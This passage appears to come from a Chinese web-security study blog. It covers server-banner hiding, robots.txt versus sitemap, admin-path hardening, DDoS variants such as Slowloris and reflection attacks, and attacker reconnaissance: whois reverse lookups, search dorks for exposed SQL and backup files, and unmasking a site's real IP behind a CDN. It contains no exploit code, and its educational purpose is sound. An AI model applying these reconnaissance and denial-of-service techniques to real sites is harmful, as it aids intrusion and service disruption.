<p>如果要替换banner名称为专有，可编辑<strong>ap_release.h文件</strong>，方法如下：修改<code>&quot;#define AP_SERVER_BASEPRODUCT&quot;Apache&quot;&quot;为&quot;#define AP_SERVER_BASEPRODUCT&quot;Microsoft-IIS/7.0&quot;</code>。这是一种欺骗的方法，能有效迷惑攻击者。毕竟Apache中怎么也不会存在IIS的漏洞，如果攻击者根据修改后的banner进行大量攻击尝试，也不会产生任何安全威胁。</p>
<h4 id="（2）PHP版本号关闭"><a href="#（2）PHP版本号关闭" class="headerlink" title="（2）PHP版本号关闭"></a>（2）PHP版本号关闭</h4><blockquote>
<p>关闭PHP版本号的方法为打开php.ini配置文件，找到expose_php On项目，将其修改为expose_php off即可。</p>
<p>修改完毕后可重新抓取response包，发现X-Powered-By中的PHP版本号已消失，</p>
</blockquote>
<h4 id="（3）修改Nginx-Banner"><a href="#（3）修改Nginx-Banner" class="headerlink" title="（3）修改Nginx Banner"></a>（3）修改Nginx Banner</h4><blockquote>
<p>修改Nginx配置中的相关项目，方法与Apache的方式类似。修改Server_tokens的值为off。修改后的效果类似Apache。</p>
</blockquote>
<h4 id="（4）修改系统默认TTL"><a href="#（4）修改系统默认TTL" class="headerlink" title="（4）修改系统默认TTL"></a>（4）修改系统默认TTL</h4><p>用以下命令修改Red Hat Linux的TTL基数为128（默认为64）：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;echo 128 &gt; /proc/sys/net/ipv4/ip_default_ttl</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;net.ipv4.ip_default_ttl = 128</span><br></pre></td></tr></table></figure>
</blockquote>
<p>修改版本号只是提高了攻击者的攻击时间成本，有效的防护措施依然是对现有漏洞进行发现和处理。不过由于攻击时间长，可为系统管理员争取一段发现时间，因此定期观察系统日志或利用各类防护系统观察攻击行为，也可尽早发现攻击者并采取后续处理措施。</p>
<h3 id="2-robots-txt"><a href="#2-robots-txt" class="headerlink" title="2.robots.txt"></a>2.robots.txt</h3><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除协议”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取、哪些页面不能抓取。</p>
<blockquote>
<p>当一个搜索引擎的爬虫访问站点时，它会首先检查该站点的根目录下是否存在robots.txt，如果该文件存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<strong>如果该文件不存在</strong>，所有的搜索引擎的爬虫将能够访问网站上所有没有被口令保护的页面。因此建议，<strong>仅当网站包含不希望被搜索引擎收录的内容时，才使用robots.txt文件</strong>；如果希望搜索引擎收录网站上所有内容，则不要建立robots.txt文件。</p>
</blockquote>
<p>使用robots.txt的好处在于，可清晰告知搜索引擎的爬虫哪些页面不能被收录，哪些页面可以被收录，从而避免敏感文件被访问。但是，robots.txt本身可以公开访问（搜索引擎的爬虫为公开环境），攻击者只需观察robots.txt里面的内容，也可能发现有效的内容。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222437042.png" alt="robots.txt文件样例"></p>
<p>利用disallow的方式可理解为黑名单的方式，甚至可以直接告知攻击者，哪些连接我是不想让搜索引擎收录的。</p>
<p>为了解决这个问题，建议将传统的robots.txt替换为sitemap。目前主流搜索引擎均支持sitemap。sitemap也叫做网站XML地图，用以格式化地标注网站的整体结构。</p>
<p>例如，百度支持三种sitemap格式：txt文本格式、xml格式、sitemap索引格式。目前常用的为xml格式。</p>
<p>以上海移动网上营业厅（<a href="http://www.sh.10086.cn)为例,其主目录下的robots.txt/">www.sh.10086.cn）为例，其主目录下的robots.txt</a></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222651935.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：</span><br></pre></td></tr></table></figure>

<p>表示允许一切搜索引擎的爬虫爬取网站信息。</p>
<p>接下来，用sitemap告知搜索引擎，该站的网站地图连接在哪里，直接读取此xml文件即可获得网站的结构。</p>
<p><strong>其优点在于利用sitemap告知了搜索引擎爬虫网站可公开的结构有哪些，其余的信息不能被爬取。</strong>这相当于实现了白名单的效果，从而很好地规避了传统写法的缺陷，值得推荐。</p>
<h3 id="3-提升后台地址复杂度"><a href="#3-提升后台地址复杂度" class="headerlink" title="3.提升后台地址复杂度"></a>3.提升后台地址复杂度</h3><p>假设<strong>前台</strong>存在SQL注入漏洞，或者管理员用户及密码已经被攻击者掌握，那么攻击者希望找到目标站点的<strong>后台地址</strong>，以便开展后续攻击。如果后台地址无法被攻击者发现，那么攻击者空有之前成果，无法登录后台开展后续攻击。</p>
<p>攻击者常用的寻找后台地址的方法就是利用搜索引擎，搜索admin相关的字眼，确认是否有后台等。</p>
<p>在大部分情况下，利用搜索引擎并不能直接发现后台，这时攻击者常用的手段就是<strong>地址爆破</strong>。地址爆破的方法是拼接URL，URL由当前“域名+常用后台地址库”进行构造，再顺序访问构造后的URL是否存在，从而对目标网站的后台地址进行爆破。目录爆破类工具是利用<strong>已经定义的后台地址库进行重复尝试</strong>，并对成功返回的地址进行尝试，从而发现后台地址。</p>
<p>作为网站所有者，<strong>基本的手段为加强后台地址复杂度</strong>，避免后台地址出现在攻击者的后台地址库中。常见的后台地址设计方案如下：</p>
<blockquote>
<p>1）将几组方便记忆的信息转换为MD5（可加SALT），再反序等；或者利用其他方式加强难度。方案可自行设计。这样做可显著提高攻击者爆破后台目录的时间成本。</p>
<p>2）还有一种情况在一些早期网站中经常出现：即在前台页面中有一项进入后台管理的功能，这会直接导致当前站点的后台地址暴露。这也就是搜索引擎会将后台地址进行收录的原因。</p>
</blockquote>
<h2 id="4-DDoS攻击及防护方法"><a href="#4-DDoS攻击及防护方法" class="headerlink" title="4.DDoS攻击及防护方法"></a>4.DDoS攻击及防护方法</h2><p>分布式拒绝服务（Distributed Denial of Service，DDoS）攻击指利用<strong>多个节点</strong>，<strong>通过各类协议对目标发动大量链接或大流量行为</strong>，导致目标由于性能及带宽原因，无法有效处理来自攻击节点的各类访问请求，最终实现服务终止的情况。</p>
<p>DDoS攻击无法造成服务器权限或数据的丢失，但会造成Web服务停止运行。</p>
<h3 id="1-DDos主要攻击方式"><a href="#1-DDos主要攻击方式" class="headerlink" title="1.DDos主要攻击方式"></a>1.DDos主要攻击方式</h3><h4 id="1-传输层洪泛攻击"><a href="#1-传输层洪泛攻击" class="headerlink" title="1.传输层洪泛攻击"></a>1.传输层洪泛攻击</h4><p>自建的网站通常要租赁运营商带宽提供Web服务。在这种情况下，由于<strong>带宽有限</strong>，一旦出现DDoS攻击，就算在本地部署了抗DDoS攻击设备且防护效果非常好，也无法恢复正常的Web应用。</p>
<p>这主要由于防护设备部署在Web服务器前端，但是运营商侧的链路早已被DDoS所<strong>阻塞</strong>死，导致正常流量一直无法达到Web服务器。</p>
<blockquote>
<p>就是说运营商分配的正常流量20mb&#x2F;s带宽，而，ddos的攻击流量就有200mb&#x2F;s，这就造成了堵塞</p>
</blockquote>
<h4 id="2-针对Web的应用层攻击"><a href="#2-针对Web的应用层攻击" class="headerlink" title="2.针对Web的应用层攻击"></a>2.针对Web的应用层攻击</h4><p>针对HTTP应用层面的攻击比较复杂，主要体现在危害性及其目标特点上。</p>
<p>常见的DDoS攻击为<strong>CC攻击</strong>，其原理是利用代理服务器或肉鸡节点向Web服务器发起大量请求，造成服务器资源耗尽，达到服务终止的效果。相同类型的攻击还有HTTP GET FLOOG等。</p>
<blockquote>
<p>CC攻击（Challenge Collapsar，挑战黑洞）</p>
</blockquote>
<p>CC攻击原理是利用代理服务器的强大性能，同时针对单一目标发起大量的请求连接，造成目标系统短时间之内无法处理过多的连接数，进而失去响应。</p>
<p>相对于4层的SYN&#x2F;ICMP等占用带宽的DDoS攻击而言，CC攻击主要是为了占用<strong>服务器的连接资源</strong>。虽然占用目的不同，但实现效果一样。在很多场景下，CC攻击常<strong>通过消耗目标服务器的性能</strong>来实现拒绝服务的效果。</p>
<p>总之，<strong>针对Web的应用层攻击就是利用大量请求来消耗目标服务器的硬件资源，实现拒绝服务的目的。</strong>针对这类攻击，通过各类<strong>云WAF或者CDN</strong>可有效解决。</p>
<h4 id="3-慢速连接攻击"><a href="#3-慢速连接攻击" class="headerlink" title="3.慢速连接攻击"></a>3.慢速连接攻击</h4><p>利用HTTP协议缺陷，伪造缺陷请求包，造成目标服务器中间件针对缺陷包的处理异常，从而实现服务器拒绝的效果，这类利用协议缺陷实现的攻击就叫做慢速连接攻击。</p>
<p>特点是利用极低带宽即可实现DDoS攻击效果，相对于CC&#x2F;HTTP get flood攻击来说，其带宽占用极小。</p>
<p>这种攻击主要有以下几种形式：</p>
<blockquote>
<p>（1）Slowloris攻击</p>
<p>HTTP协议规定，HTTP Request以\r\n\r\n（0d0a0d0a）结尾表示客户端发送结束。</p>
<p>攻击者在HTTP请求头中将Connection设置为Keep-Alive，要求Web服务器保持TCP连接不要断开，随后缓慢地每隔几分钟发送一个key-value格式的数据到服务器端，如a：b\r\n，导致服务器端认为HTTP头部没有接收完成而一直等待。</p>
<p>如果攻击者使用多线程或者多节点来做同样的操作，<strong>服务器的Web的连接数量很快就被攻击者占满</strong>，导致无法接受新的TCP连接请求。</p>
<p>kali自带一个slowhttptest工具</p>
</blockquote>
<p>正常http包结尾都是\r\n\r\n（0d0a0d0a），如果有一个包结尾是\r\n，也就是少了一组\r\n，会导致低版本中间件在接收到HTTP畸形包之后会一直保持连接打开的状态，进而实现链接占用，达到DDoS攻击的效果。</p>
<blockquote>
<p>（2）Slow HTTP POST</p>
<p>为slowloris攻击的变种形式，利用POST的方式开展攻击。</p>
<p>其核心思路是利用POST包允许在HTTP的头中声明content-length（POST包内容长度）的特点。具体原理为：在提交了相应的HTTP头以后，<strong>不发送HTTP包的body部分</strong>，导致服务器在<strong>接受了POST长度声明</strong>后会持续等待客户端发送POST的内容。假设攻击者保持连接并且以每隔10～100S一个字节的速度去发送，从而达到消耗Web服务器连接资源的效果。因此，不断地增加这样的链接，就会使得服务器的资源被消耗，最后导致拒绝服务的效果。</p>
</blockquote>
<blockquote>
<p>（3）Slow Read Attack</p>
<p>原理为通过<strong>调整TCP协议中的滑动窗口大小</strong>来对服务器单次发送的数据大小进行控制，使得服务器要<strong>将一个回应分成很多个包发送</strong>。要使这种攻击效果更加明显，请求的资源应尽量大。</p>
</blockquote>
<p>总体来说，DDoS攻击的简单、暴力特性，导致即使在服务器端添加抗DDoS类设备<strong>也无法阻止各类带宽占用</strong>的情况。但是，可以根据业务特定适当调优，<strong>提升中间件版本</strong>，避免Web应用层攻击和各类慢速连接攻击带来的危害。目前大部分<strong>运营商或者IDC均提供在线的DDoS攻击流量清洗服务</strong>，防护效果良好，可根据实际情况选用。</p>
<h4 id="4-反射型DDoS攻击"><a href="#4-反射型DDoS攻击" class="headerlink" title="4.反射型DDoS攻击"></a>4.反射型DDoS攻击</h4><p>(Distributed Reflection Denial of Service，DRDOS)的主要特点是利用互联网公共服务（如DNS、NTP等）实现。</p>
<p>攻击者将要<strong>攻击的目标伪造成查询发起方</strong>，<strong>并发送给这些公共服务</strong>。公共服务接收到请求包后，将查询结果返回到被攻击目标上。因此在大量伪造请求发起后，被攻击方会接收到大量的查询结果，导致链路严重阻塞，产生拒绝服务的效果。</p>
<p>反射型DDoS攻击的特点在于可利用<strong>非常小的流量</strong>实现针对目标的<strong>超大流量DDoS攻击</strong>，因此，其<strong>攻击成本非常低</strong>，且带宽阻塞效果显著。由于攻击流量的实际发起方为互联网公共服务，且带宽阻塞无法通过本地的设备进行防护（主要是由于运营商侧的带宽已经占满），其危害也非常严重。目前基于DNS服务、NTP服务、Web服务等都能实现这类效果。从被攻击端观察攻击特点，会发现这非常类似于传输层的DDoS攻击。</p>
<p>反射型DDoS攻击实施简单，效果良好，且对攻击方的带宽占用非常低，因此使用频率非常高。作为防御者，<strong>针对带宽占用</strong>，解决方案是利用运营商链路的<strong>流量清洗</strong>或者各类云平台的清洗服务。仅在系统前端部署防护类攻击基本无效果，这一点需要注意。</p>
<h4 id="5-如何解决DDoS攻击问题"><a href="#5-如何解决DDoS攻击问题" class="headerlink" title="5.如何解决DDoS攻击问题"></a>5.如何解决DDoS攻击问题</h4><p>为DDoS虽然不会对服务器的权限产生影响，但DDoS攻击直接会导致Web服务器失效，也就是业务停用，这对Web服务的可靠性造成极大影响，特别是会影响客户对网站的信任。因此，DDoS这种暴力破坏业务可用性的攻击手段因其简单粗暴性决定了其流行程度。</p>
<p>主要是<strong>利用TCP协议实现大量的链接</strong>，或者利用HTTP应用等实现GET FLOOD、CC攻击等。从攻击原理上说，可利用SYN、ACK、FIN三种TCP的协议规范进行DDoS攻击。</p>
<p>在防护DDoS攻击方面，标准的防护方式就是<strong>统计来自同一目标的请求频率及特点</strong>，并根据业务特点<strong>设定阈值</strong>。比如针对<strong>同一IP</strong>，每秒监测的SYN包阈值可设定为8000，那么当SYN包超过8000时，就将其丢弃，具体丢弃方法根据业务特点而定。比如，全部丢弃可实现针对单一IP的一段时间禁封；也可对超过阈值的部分进行丢弃，只允许阈值内的包通过。</p>
<p>这里有一个问题需要说明。在判断DDoS的危害方面，<strong>最为科学的指标为pps数（即每秒接收处理数据包数）</strong>，<strong>其次才是DDoS流量大小</strong>。因为在DDoS攻击中，若带宽相同，攻击者发送的攻击数据包越小，则对应单位流量下的数据包越多，即pps数越高时。由于各类设备针对数据包处理也有阈值，因此相应的防护系统处理DDoS攻击的难度就会越大。因此，常用的以Mbps来表示的DDoS攻击量，有时并不能客观体现DDoS攻击的强度。</p>
<p><strong>在DDoS攻击防护方面，目前的抗拒绝服务攻击设备都能针对上述DDoS攻击提供较好的防护效果。</strong>运营商在其主干链路中也部署了大量的旁路抗拒绝服务攻击设备。运营商旁路部署抗拒绝服务攻击设备原理是利用动态路由协议特性实现的效果，将牵引设备添加到当前BGP路由表中。当牵引设备发现当前链路中出现DDoS攻击行为时，会通过将当前链路通过更新动态路由表的方式将流量牵引至抗DDoS设备，并在对DDoS攻击流量进行清洗后将正常流量汇注到当前网络内。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152154089.png" alt="抗DDoS系统旁路部署图"></p>
<p><strong>在旁路部署时，如果出现DDoS攻击流量，防护设备对DDoS流量会进行自动牵引和清洗。</strong>这样做的好处在于整体过程对现有的传输不造成影响。由于在正常情况下流量不经过抗DDoS设备，因此不会对当前业务造成延迟，因而广泛用于各级运营商、各级骨干链路等。针对普通用户而言，旁路部署的意义不大，建议通过接口串联或者利用运营商或IDC提供的DDoS攻击清洗服务进行防御。</p>
<p>总体来说，DDoS攻击的技术简单、粗暴，其目的在于破坏目标网站的业务可用性。虽然无法获得目标服务器的权限及数据，但是随着目前互联网在线应用的日益增多及用户针对Web系统的依赖性增强，导致DDoS的效果反而非常良好。目前国内各大云服务提供商或链路提供商均已提供<strong>在线防护或清洗服务</strong>，因此从防护角度来说不必太担心。但这种攻击行为始终会影响系统的正常工作，在未来，各类DrDos等攻击行为及技术仍然还会存在较长时间。</p>
<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>攻击者在针对一个<strong>Web系统开展攻击</strong>时，必须知道<strong>目标的基本信息及可通行的路径</strong>，否则就是在进行大量无意义的尝试。因些，从<strong>防御角度</strong>，建议利用各类<strong>Web扫描器配合人工检查</strong>，对现有业务系统进行全面的安全测试，</p>
<p>总体来说，中小站点在安全防护的提升阶段可采用以下思路：</p>
<p>1）<strong>隐藏站点的敏感信息，如各类端口、各类目录等</strong>。同时，利用各类搜索引擎在互联网上搜索站点的内容，尝试发现有价值的内容，并进行针对性处理。</p>
<p>2）<strong>检查业务体系安全状况，隐藏后台地址，提升管理用户的密码强度或者限制登录范围等。</strong>同时，根据第二部分介绍的业务安全体系流程进行业务安全分析。</p>
<p>3）<strong>利用各类Web扫描器对站点进行漏洞扫描，并根据扫描结果进行定向漏洞修复或功能加固。</strong>针对无法扫描的漏洞，建议根据第一部分的漏洞防护原理进行手工测试，实现针对站点的基础漏洞加固。</p>
<p>4）在完成上述流程之后，<strong>推荐采用各类Web防护设备来构建安全防护体系。</strong>以上三步在测试过程中如果有防护设备，会对安全检查效果造成干扰，因此推荐最后部署。部署时需要详细调整防护设备的规则，以适应站点的特性。</p>
<p><strong>适度安全防护</strong>是安全防护策略中必须要考虑的因素，如何平衡安全防护投入与产出比非常关键。最后，要整体提升站点安全，避免出现木桶效应，方可实现针对系统的有效运行保障。</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>防护识别</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>防护识别</tag>
      </tags>
  </entry>
  <entry>
    <title>用户视角下的信息探测</title>
    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/</url>
    <content><![CDATA[<h1 id="1-whois信息"><a href="#1-whois信息" class="headerlink" title="1.whois信息"></a>1.whois信息</h1><p>首先，获得了域名。比如<a href="http://www.baidu.com./">www.baidu.com。</a></p>
<blockquote>
<p>域名由DNS服务器负责解析，并告知用户浏览器目标站点的IP地址。域名均由域名提供商对公众开放，可由个人或企业出资购买，获得域名的使用权。</p>
</blockquote>
<p>whois是用来查询域名的IP以及所有者等信息的传输协议。</p>
<p>通过whois可以查出目标域名是否被注册以及注册域名所有人的详细信息。</p>
<blockquote>
<p>whois信息中包含了注册商、注册人、注册人邮箱、域名注册日期、域名到期日期等信息。可以看到，其中的大量信息均为真实信息，并且这些信息对外公开。但某些情况下，域名所有人并不希望自己的注册信息被他人获取，如从事部分灰色产业的人员或者个人特定应用等。这种情况下，域名所有人可开启隐私保护功能，实现对个人信息的保护。</p>
</blockquote>
<p>当然了，隐私保护是一项增殖业务，如果账户欠费或转让，当前域名状态就失去了保护，所以查询当前域名的历史whois信息，可能获取其中的有效内容。</p>
<p>whois信息的作用非常大，比如可利用其对应的注册信息进行反向查询，发现当前域名所有者其他的域名情况，在针对某些站点进行特征追踪时效果良好。</p>
<p>如利用注册人邮箱实现whois信息反查。</p>
<p>也许可以看到，相同的邮箱注册了多个域名。再尝试访问这些域名。</p>
<blockquote>
<p>综上所述，针对要防护的目标站点，域名的whois信息作为攻击者最先获得的内容，可从中找到域名所有人的基础信息，如姓名、常用邮箱、电话等。以常用邮箱为例，攻击者有可能将邮箱信息放入<strong>社工库</strong>进行查询，以获得更广泛的信息，甚至可能发现此邮箱对应的活动内容以及当前邮箱在其他地点（很多站点支持邮箱作为用户名来注册）所用的密码等内容，这将对后续的攻击过程提供非常大的便利。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618153333278.png" alt="whois信息攻击方式"></p>
<h1 id="2-利用搜索引擎发现敏感信息"><a href="#2-利用搜索引擎发现敏感信息" class="headerlink" title="2.利用搜索引擎发现敏感信息"></a>2.利用搜索引擎发现敏感信息</h1><p>这个过程中极少与站点产生交互行为，也就有了很好的隐蔽措施。</p>
<p>通过搜索引擎的基本语法及搜索思路展开测试。</p>
<h2 id="1-常用操作符"><a href="#1-常用操作符" class="headerlink" title="1.常用操作符"></a>1.常用操作符</h2><p>搜索引擎会支持多种类型的操作符，以方便用户对目标信息进行更精确的查找。这也就为攻击者提供了信息查询的方便。目前主流的搜索引擎的查询语法中，常用的操作符有以下几种：</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>联合查询</td>
</tr>
<tr>
<td>-</td>
<td>忽略某个字</td>
</tr>
<tr>
<td>*</td>
<td>通配符，可代表多个字母</td>
</tr>
<tr>
<td>.</td>
<td>单一通配符</td>
</tr>
<tr>
<td>“ ”</td>
<td>精准查询</td>
</tr>
<tr>
<td>~</td>
<td>同义词</td>
</tr>
</tbody></table>
<h2 id="2-inurl"><a href="#2-inurl" class="headerlink" title="2.inurl"></a>2.inurl</h2><p>用于搜索在目标URL中出现关键字的信息。</p>
<blockquote>
<p>想查询格式为php的管理页面，其关键字为“admin”“php”。这时，可利用空格方式进行连接，如“inurl php id”，从而实现匹配url中的所有关键字。</p>
</blockquote>
<p><code>inurl admin</code>这种一般就是找后台</p>
<p>所以要么通过隐藏后台，要么添加允许连接IP的白名单等手段来提升安全性。</p>
<h2 id="3-title"><a href="#3-title" class="headerlink" title="3.title"></a>3.title</h2><p>关键字“tittle管理后台”、“tittle人员信息”</p>
<h2 id="4-filetype"><a href="#4-filetype" class="headerlink" title="4.filetype"></a>4.filetype</h2><p>用于指定查询文件的后缀名，如bak、sql、ini、xls、htaccess等。</p>
<blockquote>
<p>一般来说，这类信息涉及站点的备份信息、数据库信息、表格等内容。假设管理员没有及时删除，并且此信息恰好被搜索引擎收录，则会展示相应的结果。这类敏感信息会使攻击者更全面地了解目标站点的特征及有效内容。</p>
</blockquote>
<h2 id="5-site"><a href="#5-site" class="headerlink" title="5.site"></a>5.site</h2><p>site用于在指定网站内搜索有效信息，可直接使用“site：域名+关键字”来查找当前目标站点中指定的内容信息。</p>
<blockquote>
<p>如site:<a href="http://www.baidu.com/">www.baidu.com</a> asddasads</p>
</blockquote>
<h2 id="6-cache"><a href="#6-cache" class="headerlink" title="6.cache"></a>6.cache</h2><p>利用搜索引擎之前缓存的信息进行查询。利用搜索引擎之前缓存的信息进行查询。</p>
<h2 id="7-daterange"><a href="#7-daterange" class="headerlink" title="7.daterange"></a>7.daterange</h2><p>使用daterange关键词指定搜索的日期。但此方法使用起来比较麻烦，并且目前主流的搜索引擎均都自带时间控制，可在搜索引擎的筛选栏中选择所需要的部分。</p>
<h2 id="综合利用搜索引擎"><a href="#综合利用搜索引擎" class="headerlink" title="综合利用搜索引擎"></a>综合利用搜索引擎</h2><h3 id="1-使用缓存匿名浏览"><a href="#1-使用缓存匿名浏览" class="headerlink" title="1.使用缓存匿名浏览"></a>1.使用缓存匿名浏览</h3><p>利用缓存可以看到更新之前的页面，也可以匿名获取到网站服务器的数据拷贝（在此必须要选择只查看文本，不然仍会向服务器发送访问请求）。</p>
<p><code>cache:xxx.com/xxx.html</code></p>
<p>这样做的优点是：目标网站并没有真实的访问记录，只是在搜索引擎缓存的数据中进行查询。在某些特定场景，如APT攻击中，可能会有较大的用途。</p>
<h3 id="2-获取特殊信息"><a href="#2-获取特殊信息" class="headerlink" title="2.获取特殊信息"></a>2.获取特殊信息</h3><p>网站上线后并没有将原有的备份文件或SQL文件删除，还存在于网站的目录中。这样会导致网站的某些重要的信息隐藏在某个页面的角落里，使用搜索引擎可以高效地查找这些信息，使用filetype：sql或者ini、bak、log等还可以查找网站的隐私文件。</p>
<p><code>site:XXX.cn fi letype:sql</code></p>
<p>.bak这类属于备份文件</p>
<blockquote>
<p>site: xxx.com filetype:xls</p>
<p>“site powered by limbo cms” site:”xxx.com”</p>
</blockquote>
<p>搜索引擎可帮助更多用户了解及访问网站，但是其中的信息也会被搜索引擎收录。</p>
<p>作为系统管理员的话，也可以定期搜索网站特定内容，对重要信息进行处理，避免被攻击者发现。</p>
<h3 id="3-后台管理页面、目录列表或特殊页面"><a href="#3-后台管理页面、目录列表或特殊页面" class="headerlink" title="3.后台管理页面、目录列表或特殊页面"></a>3.后台管理页面、目录列表或特殊页面</h3><h4 id="后台管理页面"><a href="#后台管理页面" class="headerlink" title="后台管理页面"></a>后台管理页面</h4><p>如果攻击者发现<strong>后台登录页面</strong>，第一反应就是采取<strong>爆破</strong>等手段进行攻击，或者在<strong>前台利用SQL注入、XSS存储跨站</strong>等手段获取管理员账号信息后进行登录。因此，后台管理页面应尽量不被攻击者发现。</p>
<h4 id="目录列表"><a href="#目录列表" class="headerlink" title="目录列表"></a><strong>目录列表</strong></h4><p>正常情况下，访问一个网站会发起一个HTTP请求，Web服务器会根据请求中的URL路径来响应对应的页面。因此，用户每一次访问的页面应该只是服务器Web目录的某个页面或文件（如PDF等格式）。但是，如果Web服务器存在目录列举的问题，可<strong>导致用户端直接观察到当前目录的所有文件及结构</strong>，这样会极大暴露目标站点的信息。</p>
<p><code>intitle:index of &quot;server at&quot;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618184526853.png"></p>
<p>列目录在文件服务器中非常常见，可方便用户快速寻找所需要的文件并下载。但针对普通站点来说，如果可看到站点的相关的目录，攻击者就可快速了解站点结构，并且可对其中的重要文件或页面进行下载，</p>
<h4 id="专项搜索用法汇总"><a href="#专项搜索用法汇总" class="headerlink" title="专项搜索用法汇总"></a>专项搜索用法汇总</h4><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618184743922.png"></p>
<p>Zoome eye搜索</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618185621268.png"></p>
<h1 id="3-真实IP地址发现手段"><a href="#3-真实IP地址发现手段" class="headerlink" title="3.真实IP地址发现手段"></a>3.真实IP地址发现手段</h1><p>出现域名与真实IP不对应的情况。这主要是Web站点为了提高用户的访问速度，使用了CDN（内容分发网络）技术。</p>
<blockquote>
<p>CDN的特点是可以将内容在本地展示，并配合CDN的网络在全国各地做内容缓存分发。这样，用户直接访问的域名对应的IP地址为CDN地址，而非目标Web站点的真实地址。当初步获取到目标IP地址后，可利用目前互联网上的CDN地址段查询接口确认当前访问的地址是否为CDN。</p>
</blockquote>
<p>获取目标Web系统的真实IP地址经常利用的方式如下。</p>
<h2 id="1-查找分站的IP"><a href="#1-查找分站的IP" class="headerlink" title="1.查找分站的IP"></a>1.查找分站的IP</h2><p>由于CDN为收费服务，部分网站的某些分站由于访问量较小，因此选择仅在主站上配置CDN服务器，而分站并不配置。因此，可以遍历目标站点的分站地址，并找到分站地址对应的IP，再通过扫描C段的80端口，从而找到主站的IP地址。</p>
<blockquote>
<p>C段是指IPv4地址中的第三个部分，通常用于标识特定的网络。例如，在地址192.168.0.0&#x2F;24中，C段是0，表示这个地址是一个属于C段的地址。子网掩码是24</p>
<p>之所以是C段扫描，是因为范围更小，就2^8&#x3D;256-2&#x3D;254个主机地址，更具有针对性，资源消耗也少</p>
</blockquote>
<p>如果此网站有邮件服务器且没有使用公共SMTP服务器，也可以尝试DNS的MX记录，很多时候也会有相应收获。</p>
<h2 id="2-尝试服务器主动发起联系"><a href="#2-尝试服务器主动发起联系" class="headerlink" title="2.尝试服务器主动发起联系"></a>2.尝试服务器主动发起联系</h2><p>让服务器主动联系，就可以轻松知道服务器的IP地址。比如，服务器发送注册或者验证码邮件，在邮件头就可以知道IP地址。但目前有很多第三方验证码及验证邮件发送平台，因此需对这种方式下得到的地址进行后续人工判断，确认地址归属。</p>
<h2 id="3-ping-xxx"><a href="#3-ping-xxx" class="headerlink" title="3.ping xxx"></a>3.ping xxx</h2><p>很多人喜欢使用xxx.com（裸域）访问网站，所以部分网站为了给用户良好的体验并且不让搜索引擎认为域名已被劫持，通常都是给xxx.com（裸域）使用301重定向至<a href="http://www.xxx.com.xxx.com与www.xxx.com是不同的两条解析记录,很可能存在xxx.com没有使用cdn的情况./">www.xxx.com。xxx.com与www.xxx.com是不同的两条解析记录，很可能存在xxx.com没有使用CDN的情况。</a></p>
<blockquote>
<p>C:\Users\67538&gt;ping <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p>正在 Ping <a href="http://www.a.shifen.com/">www.a.shifen.com</a> [36.152.44.96] 具有 32 字节的数据:<br>来自 36.152.44.96 的回复: 字节&#x3D;32 时间&#x3D;34ms TTL&#x3D;56<br>来自 36.152.44.96 的回复: 字节&#x3D;32 时间&#x3D;32ms TTL&#x3D;56</p>
</blockquote>
<blockquote>
<p>C:\Users\67538&gt;ping baidu.com</p>
<p>正在 Ping baidu.com [39.156.66.10] 具有 32 字节的数据:<br>来自 39.156.66.10 的回复: 字节&#x3D;32 时间&#x3D;51ms TTL&#x3D;53<br>来自 39.156.66.10 的回复: 字节&#x3D;32 时间&#x3D;51ms TTL&#x3D;53</p>
</blockquote>
<p>可看到直接ping <a href="http://www.baidu.com返回的是www.a.shifen.com,这是百度的一个别名,用以提升各地用户的访问速度./">www.baidu.com返回的是www.a.shifen.com，这是百度的一个别名，用以提升各地用户的访问速度。</a></p>
<h2 id="4-phpinfo"><a href="#4-phpinfo" class="headerlink" title="4.phpinfo"></a>4.phpinfo</h2><p>phpinfo包含了当前服务器的真实信息</p>
<h2 id="5-XSS"><a href="#5-XSS" class="headerlink" title="5.XSS"></a>5.XSS</h2><p>如果目标站点存在存储型XSS攻击漏洞，那么就可利用XSS漏洞实现针对真实IP地址的发现。在实际情况中，如果管理员打开特殊构造的页面，且管理员与服务器在同一个网段，再结合扫描即可找到真实IP。</p>
<p>但JavaScript本身并没有获取本地IP地址的能力，一般需要第三方软件来完成。比如，客户端安装了Java环境（JRE），那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。在XSS攻击框架“Attack API”中，就有一个获取本地IP地址的API。</p>
<p>这样做的好处在于可以由服务器主动响应攻击代码，并自动发送真实IP地址。但是使用环境较为苛刻，必须要求有存储型XSS漏洞，且漏洞会被管理员或者内部人员触发。</p>
<p>当然了，既然存储型XSS漏洞存在的话，一般是直接利用存储型XSS漏洞<strong>获取管理员权限</strong>，<strong>并寻找后台地址进行登录尝试</strong>。</p>
<blockquote>
<p>知道管理员的账号和密码的前提下，获取到cookie，然后放到请求头中，发给服务器。</p>
</blockquote>
<h2 id="6-全网扫描"><a href="#6-全网扫描" class="headerlink" title="6.全网扫描"></a>6.全网扫描</h2><p>利用分布式扫描工具进行全网扫描，并进行特征分析及提取，进而确定目标的真实地址。</p>
